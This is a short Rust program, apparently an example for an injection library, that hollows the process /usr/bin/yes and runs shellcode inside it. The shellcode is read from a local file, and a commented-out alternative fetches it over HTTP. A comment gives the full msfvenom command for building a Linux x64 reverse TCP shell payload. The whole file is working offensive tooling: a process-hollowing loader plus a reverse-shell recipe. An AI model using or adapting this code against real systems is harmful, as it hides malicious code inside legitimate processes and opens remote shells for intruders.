#![allow(unused_imports)]
extern crate libinject;
use libinject::{get_binary_filesystem, get_binary_http, hollow};
use std::env::current_dir;

fn main() {
    let path = current_dir().unwrap();
    let cwd = path.display();

    // Shellcode:
    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
    let shellcode_location = format!("{}/shellcode.bin", cwd);
    // let shellcode_location = "http://127.0.0.1:8081/shellcode.bin";
    let target = "/usr/bin/yes";
    let shellcode_bytes = get_binary_filesystem(&shellcode_location);
    // let shellcode_bytes = get_binary_http(binary_location);

    match hollow(target, "", &shellcode_bytes) {
        Ok(res) => res,
        Err(error) => panic!("An error occured: {error:?}"),
    };
}
